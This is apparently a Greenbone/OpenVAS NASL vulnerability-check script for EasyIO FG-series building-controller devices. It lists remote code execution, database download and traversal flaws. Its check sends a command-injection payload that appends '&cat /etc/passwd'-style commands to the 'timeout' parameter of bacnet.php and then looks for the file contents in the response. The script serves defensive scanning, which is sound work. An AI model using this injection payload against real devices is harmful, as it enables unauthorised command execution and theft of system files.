CPE = "cpe:/a:easyio:easyio";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140106" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_name( "EasyIO Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "https://blogs.securiteam.com/index.php/archives/2908" );
	script_tag( name: "vuldetect", value: "Try to read /etc/passwd" );
	script_tag( name: "insight", value: "EasyIO FG-series devices are prone to multiple vulnerabilies:

  - Unauthenticated remote code execution

  - Unauthenticated database file download

  - Authenticated directory traversal vulnerability" );
	script_tag( name: "solution", value: "Check with the vendor for fixed firmware versions." );
	script_tag( name: "summary", value: "EasyIO FG-series devices are prone to multiple vulnerabilies." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-12-28 14:42:25 +0100 (Wed, 28 Dec 2016)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_dependencies( "gb_EasyIO_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80, 443 );
	script_mandatory_keys( "easyio/installed" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = "/sdcard/cpt/scripts/bacnet.php?action=discoverDevices&lowLimit=0&highLimit=0&timeout=0%26cat%20/" + file;
	req = http_get_req( port: port, url: url, add_headers: make_array( "X-Requested-With", "XMLHttpRequest" ) );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(egrep( string: buf, pattern: pattern ) && ContainsString( buf, "SUCCESS" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

